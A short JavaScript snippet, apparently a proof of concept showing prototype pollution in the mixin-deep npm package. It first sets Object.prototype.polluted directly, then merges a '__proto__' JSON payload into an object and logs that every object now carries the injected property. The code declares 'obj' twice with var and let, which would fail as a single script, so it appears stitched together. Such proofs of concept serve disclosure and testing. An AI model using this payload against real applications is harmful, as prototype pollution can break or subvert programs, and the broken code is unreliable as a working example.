var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const mixin = require('mixin-deep');
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
let obj = {};
console.log({}.polluted);
mixin(obj, JSON.parse(malicious_payload));
console.log({}.polluted);